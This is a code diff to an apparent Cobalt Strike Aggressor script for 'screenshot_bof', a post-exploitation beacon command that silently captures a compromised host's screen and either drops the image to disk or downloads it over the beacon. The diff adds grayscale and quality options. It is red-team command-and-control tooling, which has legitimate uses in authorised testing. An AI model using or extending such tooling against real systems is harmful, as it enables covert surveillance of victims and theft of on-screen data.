@@ -3,7 +3,7 @@
 beacon_command_register(
     "screenshot_bof",
     "Alternative screenshot capability that does not do fork n run",
-    "Use: screenshot_bof [filename] [save method] [PID]\nSet PID to 0 for full screen capture\nSave methods:\n\t0: drop file to disk\n\t1: download over beacon as a file\n\t2: download over beacon as a screenshot\n\nTake a screenshot inline using a BOF. Screenshot is saved as JPEG on disk or downloaded over beacon."
+    "Use: screenshot_bof [filename] [save method] [PID] [grayscale(0/1)=0] [quality 0-100=90]\n- PID 0 captures full screen\n- Save methods: 0 drop to disk, 1 download file, 2 download screenshot\n- Grayscale/quality optional; defaults applied when omitted\n\nTake a screenshot inline using a BOF. Screenshot is saved as JPEG on disk or downloaded over beacon."
 );
 
 alias screenshot_bof {
@@ -11,10 +11,10 @@ alias screenshot_bof {
     $bid = $1;
     # figure out the arch of this session
     $barch  = barch($bid);
-    if (size(@_) != 4)
+    if (size(@_) < 4 || size(@_) > 6)
     {
-        berror($1, "Syntax: screenshot_bof [filename] [save method 0/1/2] [PID] e.g. screenshot_bof file.JPEG 1 1234\nNote: set PID to 0 to capture full screen.");
-                return;
+        berror($1, "Syntax: screenshot_bof [filename] [save method 0/1/2] [PID] [grayscale(0/1)=0] [quality 0-100=90]\nNote: set PID to 0 to capture full screen.");
+        return;
     }
     # read in the right BOF file
     $handle = openf(script_resource("ScreenshotBOF. $+ $barch $+ .obj"));
@@ -27,7 +27,10 @@ alias screenshot_bof {
     # $getOnlyProfile = [$profile shouldChunkPosts];
     # println($getOnlyProfile);
 
-    $args   = bof_pack($bid, "zii", $2, $3, $4);
+    $grayscale = iff(size(@_) >= 5, $5, 0);
+    $quality   = iff(size(@_) >= 6, $6, 90);
+
+    $args   = bof_pack($bid, "ziiii", $2, $3, $4, $grayscale, $quality);
 
     # announce what we're doing
     btask($bid, "Running screenshot BOF by (@codex_tf2)", "T1113");
